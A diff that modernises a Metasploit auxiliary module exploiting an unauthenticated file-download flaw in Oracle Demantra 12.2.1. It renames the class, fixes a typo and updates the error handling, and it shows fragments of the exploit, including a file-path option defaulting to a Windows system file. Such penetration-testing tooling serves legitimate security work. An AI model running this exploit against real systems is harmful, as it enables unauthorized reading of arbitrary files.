@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -17,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module exploits a file download vulnerability found in Oracle
         Demantra 12.2.1 in combination with an authentication bypass. By
-        combining these exposures, an unauthenticated user can retreive any file
+        combining these exposures, an unauthenticated user can retrieve any file
         on the system by referencing the full file path to any file a vulnerable
         machine.
       },
@@ -41,9 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptBool.new('SSL',   [false, 'Use SSL', false]),
         OptString.new('FILEPATH', [true, 'The name of the file to download', 'c:/windows/win.ini'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def run_host(ip)
@@ -60,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res.nil? or res.body.empty?
-      fail_with("No content retrieved from: #{ip}")
+      fail_with(Failure::UnexpectedReply, "No content retrieved from: #{ip}")
     end
 
     if res.code == 404
